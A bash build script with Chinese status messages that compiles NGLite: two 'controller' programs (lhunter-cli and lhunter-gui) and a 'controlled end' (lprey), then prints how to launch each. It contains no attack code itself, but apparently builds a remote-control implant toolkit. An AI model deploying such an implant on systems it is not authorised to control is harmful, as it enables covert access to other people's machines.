#!/bin/bash

set -e

echo "开始编译 NGLite..."
echo ""

mkdir -p bin

echo "1. 编译 CLI 控制端 (lhunter-cli)..."
go build -o bin/lhunter-cli ./cmd/lhunter-cli
echo "   ✓ bin/lhunter-cli"

echo ""
echo "2. 编译 GUI 控制端 (lhunter-gui)..."
go build -o bin/lhunter-gui ./cmd/lhunter-gui
echo "   ✓ bin/lhunter-gui"

echo ""
echo "3. 编译被控端 (lprey)..."
go build -o bin/lprey ./cmd/lprey
echo "   ✓ bin/lprey"

echo ""
echo "编译完成！"
echo ""
echo "运行方式："
echo "  CLI 控制端: ./bin/lhunter-cli"
echo "  GUI 控制端: ./bin/lhunter-gui"
echo "  被控端:     ./bin/lprey -g <seed>"
echo ""
echo "查看详细使用说明: cat GUI_README.md"

